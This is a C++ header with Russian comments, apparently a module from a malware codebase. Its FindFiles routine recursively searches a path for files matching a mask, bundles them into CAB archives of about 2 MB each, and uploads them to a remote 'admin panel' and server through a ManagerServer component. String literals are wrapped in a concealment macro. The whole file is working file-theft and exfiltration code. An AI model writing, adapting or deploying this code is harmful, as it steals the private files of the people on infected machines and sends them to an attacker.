#pragma once

#include "other.h"
#include "core\file.h"
#include "core\cab.h"
#include "core\debug.h"
#include "Manager.h"

const int MaxCabs = 50;
const int MaxSize = 2 * 1024 * 1024; //максимальный размер файлов помещаемых в один архив

struct ParamFindFiles
{
	Cab* cab[MaxCabs];
	int countCab;
	int currSize;
	int countFiles; //количество найденных файлов
	const char* mask;
};

static bool FindFilesCallback( File::FileInfo& fi, void* tag )
{
	ParamFindFiles* pff = (ParamFindFiles*)tag;
	if( Str::IndexOf( fi.fd.cFileName, pff->mask ) >= 0 )
	{
		if( pff->countCab == 0 || pff->currSize > MaxSize )
		{
			if( pff->countCab > 0 ) pff->cab[pff->countCab - 1]->Close();
			pff->currSize = 0;
			if( pff->countCab >= MaxCabs ) return false; //останавливаем поиск
			pff->cab[pff->countCab] = new Cab();
			pff->countCab++;
		}
		pff->cab[pff->countCab - 1]->AddFile( fi.fd.cFileName, fi.fullName->c_str() );
		pff->currSize += fi.fd.nFileSizeLow;
		pff->countFiles++;
	}
	return true;
}

int FindFiles( const StringBuilder& path, const StringBuilder& mask, int dst, const StringBuilder& name )
{
	ParamFindFiles pff;
	pff.countCab = 0;
	pff.countFiles = 0;
	pff.mask = mask.c_str();
	File::ListFiles( path, _CS_("*.*"), &FindFilesCallback, true, &pff );
	if( pff.countCab > 0 && pff.currSize > 0 ) pff.cab[pff.countCab - 1]->Close(); //закрываем последний архив
	for( int i = 0; i < pff.countCab; i++ )
	{
		Mem::Data& data = pff.cab[i]->GetData();
		if( dst & 1 ) //в админку
		{
			StringBuilder fileName;
			fileName = name;
			fileName += _CS_(".cab");
			ManagerServer::SendData( name, data.Ptr(), data.Len(), true, fileName );
		}
		if( dst & 2 ) //на сервер
		{
			ManagerServer::SendFileToVideoServer( _CS_("cabs"), name, _CS_("cab"), data );
		}
		delete pff.cab[i];
		Delay(2000);
	}
	return pff.countFiles;
}
